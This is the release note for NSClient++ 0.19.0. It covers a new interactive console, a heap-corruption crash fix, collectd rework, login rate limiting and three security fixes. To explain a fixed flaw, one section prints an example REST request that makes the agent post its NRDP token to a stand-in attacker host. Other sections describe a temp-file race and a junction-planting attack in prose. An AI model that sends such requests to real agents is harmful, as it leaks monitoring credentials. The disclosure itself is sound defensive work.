---
date:
  created: 2026-09-07
---

# 0.19.0 A real `nscp test` prompt, a crash fix for service filters

0.19.0 gives the interactive console a proper prompt — line editing, history,
tab completion and highlighting — and fixes a heap-corruption crash that took
the whole agent down whenever a `check_service` filter matched nothing (#1499).
A whole-codebase security review closed three findings: a client module's
configured credential could be sent to a caller-chosen host, REST script
uploads were staged at a predictable path, and a junction defeated the
modern-layout lockdown of `%ProgramData%\NSClient++`. The collectd client was
reworked end to end — host names resolve, `timeout` and `retries` are honoured,
failed sends are reported, datagrams are sized correctly and a multicast target
no longer fans out over every local interface.

Alongside that, the WEB server's authentication limiter escalates against
rapid-fire guessing, NRDP warns about an unverified TLS link, Icinga honours a
base path in the target address, every documented query now has prose and
captured samples, and the *Upgrading* and *Security notices* pages are
assembled from one file per note with a module/version/action filter.

## ✨ Highlights

- 🖥️ **`nscp test` is a real prompt.** On a terminal you get line editing,
  persistent per-user history, position-aware tab completion against the
  command registry, hints, and highlighting that turns an unknown query or
  module name red before you press enter. Log messages redraw around the line
  you are typing instead of landing in the middle of it. Piping commands in now
  works on Windows, and an exhausted stdin no longer spins a core at 100%.
  (#1488)
- 🛡️ **A `check_service` filter that matched no service no longer kills the
  agent.** `check_service "filter=name = 'nosuchservice'"` — or a filter that
  merely missed on case — terminated `nscp` with exception code `0xC0000374`
  and no result. Both `check_service` keywords and `check_logfile`'s `column()`
  now answer the documented empty-result contract, and every optional read in
  the tree goes through `.value()` so a future miss is a reported error, not a
  write to freed memory. (#1499)
- 🔐 **Client credentials stay with their target.** `host=`, `port=` and
  `address=` moved a submission's destination while the target's configured
  `password` or `token` came along, so any holder of `queries.execute` could
  have the agent post the NRDP token, the Icinga login, the SMTP login or the
  NSCA password to a host of their choosing. That combination is refused now;
  `target=` also works for queries, and `allow host override = true` restores
  the old behaviour per target. (#1492)
- 🔒 **Two more review findings closed.** `PUT /api/v2/scripts/…` staged the
  upload at `${temp}/<name>`, where a local user could plant a file of the same
  name and have it imported as a command; it is staged in a randomly named,
  owner-only file now. On the opt-in modern layout, a pre-created junction at
  `%ProgramData%\NSClient++` had the lockdown secure the junction's *target*;
  reparse points are refused and the installer, the migration and service start
  all fail on one. (#1492)
- 📡 **The collectd client works the way its settings say.** A target named by
  host name threw on every metrics cycle; `timeout` and `retries` were read and
  ignored; a failed send looked exactly like a delivered one; a value list of a
  few hundred entries overflowed the 1452-byte datagram the receiver reads; and
  a multicast target sent a copy through every local interface, DMZ and guest
  NICs included. All fixed, with a new per-target `multicast interface` setting
  (`auto`, the default, `all`, or a list of local addresses). (#1494)
- 🔒 **Failed WEB logins back off exponentially.** The fixed 60-second block
  after ten failures let an attacker resume at a steady rate forever — about
  14 000 guesses a day per address. Each further block now doubles up to an
  hour, but only for a run of failures that burned the whole budget at machine
  speed, so a client retrying a stale password behind NAT cannot lock out
  everyone sharing its address. (#1493)
- 🔧 **The console log is no longer held in a 64 KB buffer**, so `nscp test`
  shows log lines as they happen instead of when you press a key, and a
  redirected or supervised console streams. `--no-stderr` and the `oneline`
  format finally take effect. (#1488)
- 📚 **Every documented query has a description and samples**, captured
  against a running agent, with the errors the capture turned up corrected in
  the text. The *Upgrading* and *Security notices* pages are now built from one
  file per note, with a filter for the version you come from, the modules you
  run and whether a note needs action. (#1480, #1482)

## 🔍 Detailed changes

### 🖥️ CommandClient — `nscp test` gets a real prompt

The interactive console was a poll loop around `std::getline`: no line
editing, no history, no colour. When both stdin and stdout are a terminal it
now runs on [replxx](https://github.com/AmokHuginnsson/replxx), vendored under
`libs/replxx/` (byte-identical to upstream so provenance can be diffed; no
network needed at build time).

| | |
|---|---|
| **History** | Persistent, per user, saved after every command (`nscp test` is routinely killed). `%APPDATA%\NSClient++\console-history.txt` on Windows, `$XDG_STATE_HOME/nscp/console-history` or `~/.nscp_history` elsewhere, created `0600` on POSIX. |
| **Completion** | Position-aware: built-in verbs and registered queries in command position, query names after `desc`, the query's own parameter names as `name=` once you are typing arguments. `load`/`enable` offer the modules that are *not* yet loaded or enabled, `unload`/`disable` the ones that are. |
| **Highlighting** | A query or module name that does not resolve turns red before you press enter. |
| **Hints** | The command's one-line description, greyed after the cursor. |
| **Log** | The agent logs from a background thread the whole time the prompt is up; messages are drawn above the prompt and the half-typed line redrawn underneath. Multi-line results keep their line breaks. |

Commands typed at a prompt can carry credentials, so a new `[/settings/cli]`
section controls what is kept: `history size = 0` turns persistence off,
`history file` relocates it, `color` disables colour.

The first `load <tab>` of a session pauses while the core scans the module
directory; it is done once per process. `help` is now generated from the same
vocabulary as the prompt, so it lists all sixteen built-in verbs instead of the
eight it had drifted to, and an empty `Performance data:` line is no longer
printed after every result that has none. See
[Test mode](https://nsclient.org/docs/concepts/test-mode/).

**With stdin not a terminal nothing changes** — no prompt, no history, no
colour — except three fixes: piping commands in now works on Windows (the
readiness check used a console-only API and silently ignored a file or pipe),
an exhausted stdin parks the loop instead of spinning at 100% CPU on POSIX,
and end of input is no longer treated as a reason to exit, which is how the
agent is normally started under a supervisor.

To make this possible a module can now take the console over: the new
`NSAPISetLogOption` core API accepts the same strings as the `--log` switch,
and the prompt calls `set_log_option("no-console")` while it owns the
terminal. Fixing the one-way `console` flag exposed that `oneline` and
`no-std-err` were being forwarded to the log *level* parser, rejected with
`Invalid log level: no-std-err`, and never applied. Both reach the log driver
now.

### 🔧 Core — the console log is flushed

The console log backend installed a 64 KB buffer on standard output and
nothing ever emptied it. MSVC's stream honours that buffer, so on Windows log
output sat there until something else flushed the stream — in `nscp test`
that was reading the next line of input, which is why the log appeared to
catch up only when you pressed a key. A redirected console (`nscp test >
log.txt`, a container, a supervisor) looked mute until 64 KB had built up or
the process exited. Every message is flushed as it is written now.

### 🛡️ Filters — an empty filter result no longer corrupts the heap

When nothing matches a filter, the framework re-evaluates the warning and
critical expressions with no object bound to the evaluation context, so that an
expression which also reads the summary (`… or count = 0`) still reaches a
verdict. `check_service` defaults to `not state_is_perfect()` and
`not state_is_ok()`, and both read the service straight off the context without
checking one was there. That dereferenced an empty optional, resurrecting a
destroyed `shared_ptr` control block out of the vacated storage; the copy taken
of it wrote to freed heap memory, and the process died somewhere unrelated with
`0xC0000374` and no usable stack. `debug=true` masked it, because with debug on
the context keeps a copy of every object and the stray write lands on live
memory. `check_logfile`'s `column()` keyword had the same unguarded access.

Both keywords now report an unresolved value when no object is bound, as the
built-in keywords already did, and the check returns `UNKNOWN: No services
found`. The accessor underneath throws a filter error instead of reading the
vacated storage. Any host past `allowed hosts` could trigger this over NRPE
with `allow arguments = true`, and any authenticated REST client could; the
Unix implementation already had the guard and was never affected. (#1499)

As a follow-up, all 214 optional dereferences across 67 files were converted
to `.value()`, including the ones sitting under an `if (opt)` guard: the guard
is what a later edit moves or deletes, and uniformity is what makes the rule
checkable. `.value()` throws `bad_optional_access`, which the `catch` around
every filter evaluation turns into a reported error on the check.

### 🔐 Client modules — credentials pinned to their target

The shared client parser loads the module's `default` target — credential
included — and then applies the request's arguments on top. `host=`, `port=`
and `address=` moved the destination while the credential stayed, so

```
GET /api/v1/queries/submit_nrdp/commands/execute?address=http://attacker.example/nrdp/&command=x&result=0&message=x
```

had the agent post the configured NRDP token to the attacker. Both seeded REST
roles carry `queries.execute` and the permission policy is off by default, so a
checks-only REST user was enough; over NRPE it needed `allow arguments = true`.
Affected are the modules whose targets carry a credential: NSCA, NSCA-NG,
NRDP, Icinga, SMTP and NSCP.

A request that moves the destination away from the target's configured address
is now refused when the credential that would travel is the target's own. The
guard decides on two facts — the resolved destination differs from the one the
target configured, and at least one credential still in the container is the
target's rather than the request's — so a target with no credential, a request
that supplies its own `password=`/`token=`, and a request that does not move
the destination are all unaffected, and a destination moved through a header
host entry is caught too. `allow host override = true` on a target restores the
old behaviour explicitly.

`target=` now selects a configured target on the query path as well. It was
only ever applied when a command ran as an *exec*; as a query — which is what a
REST or NRPE caller gets for `check_*` and `submit_*` — it was accepted and
silently ignored, so the one remedy the refusal recommends did not work where
the refusal is most likely to be met.

### 🔒 WEBServer — script uploads are staged privately

`PUT /api/v2/scripts/…` (admin only) wrote the body to `${temp}/<name>` —
`/tmp`, or `C:\Windows\Temp` for a SYSTEM service — with an unchecked
truncating write, then imported it as a command. A local user who created that
file first won a race against the copy, or won outright where the service's
overwrite was refused and the failure ignored, and the planted content then ran
as the service account. Stock DEB/RPM installs were not exploitable for code
execution (the service runs as `nsclient` and the script root is root-owned).
Uploads now go to a randomly named file, created exclusively and owner-only,
never through a symlink, with every write checked and the file removed once
consumed; a staging failure is reported as HTTP 500 instead of importing
whatever was on disk.

### 🔒 Windows modern layout — the shared folder must be a real directory

The opt-in, experimental `LAYOUT=modern` install keeps `nsclient.ini`, the
fleet private key and the TLS material in `%ProgramData%\NSClient++` and locks
the folder down by taking ownership and replacing its DACL. Every step was
path-based, and a standard user can create a junction under that name before
the installer first runs: the owner and DACL were applied to the junction's
*target* while the link stayed theirs to swap for a real folder with a crafted
`nsclient.ini`, which the next service start loaded as SYSTEM.

Ownership and the DACL are now applied through a handle opened on the entry
itself (`FILE_FLAG_OPEN_REPARSE_POINT`, one open per operation asking only for
the rights that operation needs), and anything that is not a plain directory
is refused — by the installer, by `nscp settings --migrate-layout modern`, and
at service start. Legacy installs are untouched.

### 📡 CollectdClient — the sender reworked

| Problem | Fix |
|---|---|
| A target address written as a host name threw on every metrics cycle (`make_address()` accepts IP literals only), so metrics silently never left. | Addresses are resolved; an unresolvable target is reported by name. The first endpoint the resolver returns is used. |
| `timeout` and `retries` were read into the connection and never used; the send was asynchronous and discarded its error code, so an unreachable target, a full socket buffer or an oversized datagram looked exactly like a delivered packet. | The send is synchronous and checked. A locally failed send is retried up to `retries` times (default 3, 20 ms apart); the whole send, name resolution included, runs under `timeout` (default 30 s, `0` for no limit); failures are logged once per distinct message. A datagram the receiver already has is never sent twice. |
| Nothing bounded a values part, so a value list of a few hundred entries overflowed the 1452-byte datagram the collectd network plugin reads, and past ~3600 entries the part length wrapped and put a malformed part on the wire. One overlong host name could consume the whole packet. | Each metric is costed against what the packet has left and flushed first when it does not fit; identifiers are clamped to 127 bytes (what the receiver stores); values that cannot fit a datagram of their own are counted and the number dropped is logged. Packets fill to the real limit again instead of stopping at roughly half. |
| A multicast target (no address configured → `239.192.74.66:25826`) sent a copy of every datagram through every local interface of the matching family — unauthenticated cleartext host name, CPU, memory, uptime and process counts on every attached segment. On a Debian-style host whose name maps to `127.0.1.1` the enumeration yielded loopback only, so nothing left the machine at all. | New per-target `multicast interface`: `auto` (default) sends one copy through the interface the routing table picks; `all` restores the fan-out; a comma-separated list of local IP addresses sends through exactly those, with an unusable entry reported and skipped and a wholly unusable list sending nothing rather than falling back to the default route. |
| `sent` counted datagram × socket while `failed` counted payloads, so the "not sent" count underflowed to about 1.8 × 10¹⁹ on a multi-interface target. | A datagram is one unit of work whatever the interface count; `sent + failed` accounts for every payload. |

The UDP delivery half moved out of the module into `net/collectd/`, where it
is unit-tested against a real loopback socket, and the integration suite gained
a target named `localhost`.

### 🔒 WEBServer — escalating block on repeated authentication failures

The per-IP limiter blocked a client for a fixed `auth rate limit block
seconds` (default 60) after `auth rate limit max failures` (default 10)
consecutive failures and then reset its counter — roughly 14 000 guesses a day
per source address, indefinitely, against Basic auth, the `password` header and
the legacy `?password=` form `check_nscp_api` uses. Each consecutive block from
the same IP now doubles the wait, up to an hour; a configured block already
longer than that is used as configured. The escalation resets on a successful
authentication or after an hour of quiet.

Only a run of failures that burned the whole budget faster than one attempt
every two seconds escalates. The limiter keys on the socket peer, so behind
NAT or a reverse proxy every client shares one address, and a single
monitoring client retrying a stale password on a schedule must not be able to
ratchet that address up to the ceiling. Bearer / `?TOKEN=` session tokens are
not metered: they are 256-bit random values, and counting an expired one
against the limit would let a client with a stale session lock its own address
out. This is defence in depth on top of PBKDF2 and the uniform 403; IP rotation
remains out of scope.

### 🔒 NRDPClient — an unverified TLS link is logged

An `https` submission whose `verify mode` carries no peer-verifying token
sends the token — a shared secret — to whichever server answers. The module now
logs that, naming the endpoint, once per target for the life of the process
(the Icinga client already did; a first cut logged on every submission, which
at a 60-second schedule is 1 440 lines a day). The connection itself is
unchanged. The `verify mode` help text is corrected in the same pass: it
recommended `none` for self-signed certificates and listed `client-once`,
`workarounds` and `single`, which the client-side parser rejects. Use
`peer-cert` with `ca` pointing at the certificate instead.

### 🔧 IcingaClient — a base path in the target address is honoured

The path of a target `address` (`https://proxy.example.com/icinga/`) was
parsed into a field nothing read, so every call went to `/v1/…` on the host and
an Icinga 2 master published under a reverse-proxy subpath could not be
reached. The prefix is normalised once (a doubled leading slash collapses to
one, no trailing slash) and prepended to every API path, for the submission and
the ensure-objects calls alike. Addresses without a path are unchanged.

### 📚 Documentation

- **Upgrading and Security notices can be filtered. The reader picks the version 
  they come from, ticks the modules they run, and can restrict to security-relevant 
  or action-needing notes; the selection is remembered and mirrored into the query string.
- **Test mode has a page** — keys, what completion offers, where history is
  kept and how to turn it off, non-interactive behaviour, and the
  stop-the-service dance on both platforms.
- **REUSE metadata matches the bundled headers**: the asio and SimpleIni
  overrides carried copyright years from later releases than the copies
  vendored here. (#1486)

## ⚠️ Upgrade notes

- 🔒 **A `check_service` filter that matched no service no longer kills the
  agent.** Nothing to configure. If you worked around it with `service=<exact
  name>` and no `filter=`, service name patterns are usable again.
- 🔒 **A client target no longer lets a request send its configured
  credential to a destination the request names.** A `submit_*`/`check_*`
  call that passes `host=`, `port=` or `address=` against a target with a
  `password` or `token`, without supplying the credential itself, now fails
  with an error naming the target. Pass the credential with the request,
  configure each server as its own target and select it with `target=` (which
  now works for queries too), or set `allow host override = true` on the
  target. Targets without a credential are unaffected.
- 🔒 **REST script uploads are staged in a private, randomly named file.** No
  configuration change; a staging failure is now an HTTP 500.
- 🔒 **Modern layout (opt-in, experimental): the shared folder must be a real
  directory.** A `%ProgramData%\NSClient++` that is a junction or symbolic
  link is refused by the installer, by `nscp settings --migrate-layout
  modern`, and at service start. Relocate the folder with a `[paths]` override
  in `boot.ini` instead. Legacy installs are unaffected.
- 🔒 **A multicast collectd target now sends through one interface, not all
  of them.** If you depend on a multicast target reaching several segments,
  set `multicast interface = all` on it, or list the local addresses to send
  through. Unicast targets ignore the setting.
- 🔒 **Repeated rapid-fire failed WEB logins from one IP are blocked for
  longer each time.** Nothing to do on a default install. A probe that
  deliberately authenticates with bad credentials will be blocked for longer;
  `auth rate limit max failures = 0` still disables the limiter for a test
  harness.
- 🔒 **An NRDP submission over an unverified `https` link now says so in the
  log**, once per target. If it names a target you expected to be verified,
  set `verify mode = peer` (or `peer-cert` with a `ca`).
- 🔧 **`nscp test` writes a per-user history file.** Commands typed at the
  prompt can carry credentials; set `history size = 0` under `[/settings/cli]`
  to keep nothing on disk. With stdin not a terminal nothing changes, except
  that piping commands in now works on Windows and end of input no longer
  exits.
- 🔧 **The console log is no longer buffered**, and `--no-stderr` and the
  `oneline` log format now take effect. Nothing to do unless you were working
  around either.
- 🔧 **`target=` now selects a configured target on the query path.** A REST
  or NRPE query that passed `target=` and relied on reaching `default` anyway
  will now reach the target it named.
- ⏱️ **collectd submissions honour `timeout` and `retries` and report failed
  sends.** Nothing to do unless you set a large `retries` on a collectd
  target — it now costs real time, bounded by `timeout` (default 30 s;
  `timeout = 0` for no limit).
- 🔧 **An Icinga target address with a path prefix is now sent.** If a target
  address carries a path that is *not* a subpath of the API, remove it.

Full detail on the security items lives in [Security notices](https://nsclient.org/docs/security/notices/); the operator
actions are mirrored on [Upgrading](https://nsclient.org/docs/setup/upgrading/).


## Download

[You can download the new version from GitHub](https://github.com/mickem/nscp/releases/0.19.0){ .md-button }

// Michael Medin
